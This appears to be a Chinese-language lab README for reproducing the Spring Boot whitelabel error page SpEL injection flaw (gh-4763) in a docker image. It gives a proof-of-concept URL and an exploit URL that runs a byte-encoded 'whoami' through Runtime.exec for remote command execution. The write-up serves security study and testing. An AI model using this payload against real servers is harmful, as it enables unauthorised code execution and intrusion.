## Spring Boot whitelabel-error-page SpEl 代码执行漏洞(gh-4763)

### 漏洞信息

 * [whitelabel error page vulnerability #4763](https://github.com/spring-projects/spring-boot/issues/4763)
 * [Spring Boot框架表达式注入漏洞](http://www.cnnetarmy.com/spring-boot%E6%A1%86%E6%9E%B6%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/)
 * [Spring Boot框架Whitelabel Error Page SpEL注入漏洞分析](http://www.moonsec.com/post-701.html)

### 获取环境:

1. 拉取镜像到本地

 ```
$ docker pull medicean/vulapps:s_springboot_1
 ```

2. 启动环境

 ```
$ docker run -d -p 80:8080 medicean/vulapps:s_springboot_1
 ```
 > `-p 80:8080` 前面的 80 代表物理机的端口，可随意指定。 

### 使用与利用

访问 `http://你的 IP 地址:端口号/`, 假设启动的端口号为 8080

#### PoC

访问：

```
http://localhost:8080/fail2?payload=${new java.lang.String(new byte[]{97,98,99,100,101})}.
```

#### Exp

执行命令：

```
http://localhost:8080/fail2?payload=${T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{119,104,111,97,109,105}))}.
```

> 该 exp 没有回显，可稍处理转成有回显 Exp
